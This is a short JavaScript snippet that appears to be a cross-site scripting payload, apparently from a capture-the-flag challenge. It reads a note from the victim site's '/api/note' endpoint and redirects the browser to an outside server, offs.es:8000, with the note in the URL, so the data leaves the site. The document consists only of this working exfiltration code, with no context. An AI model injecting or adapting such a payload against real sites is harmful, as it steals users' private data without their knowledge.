(async () => {
  const { note } = await (await fetch('/api/note')).json();
  location = 'http://offs.es:8000/?f=' + encodeURIComponent(note);
})();

